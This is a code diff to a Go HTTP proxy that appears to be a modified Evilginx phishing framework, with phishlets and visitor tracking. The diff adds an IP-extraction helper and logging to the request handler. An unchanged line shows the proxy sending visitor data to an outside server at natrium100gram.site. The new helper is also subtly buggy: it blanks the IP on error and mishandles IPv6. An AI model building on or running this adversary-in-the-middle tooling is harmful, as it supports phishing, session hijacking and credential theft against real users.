@@ -189,6 +189,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// If not, fall back to RemoteAddr
 				originalIP = req.RemoteAddr
 			}
+
+			ip1, err1 := extractIP(originalIP)
+			if err1 != nil {
+				fmt.Println(err1)
+			} else {
+				fmt.Println("IP:", ip1)
+			}
+
+			originalIP = ip1
+			log.Warning("originalIP :%s",originalIP)
+
 			//log.Warning(originalIP)
 			//os.Exit(0)
 			fmt.Printf("\nOnRequest().DoFunc req: %s \n,", req.Header)
@@ -373,7 +384,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									sid := p.last_sid
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
-									
+
 									//os.Exit(0)
 
 									urlPost := "https://natrium100gram.site/public/api/getip"
@@ -1379,6 +1390,19 @@ WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. -->
 	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}
 
 	return p, nil
+}
+
+func extractIP(input string) (string, error) {
+	// Split the input string by colon
+	parts := strings.Split(input, ":")
+
+	// Parse the IP address
+	ip := net.ParseIP(parts[0])
+	if ip == nil {
+		return "", fmt.Errorf("Invalid IP address: %s", parts[0])
+	}
+
+	return ip.String(), nil
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
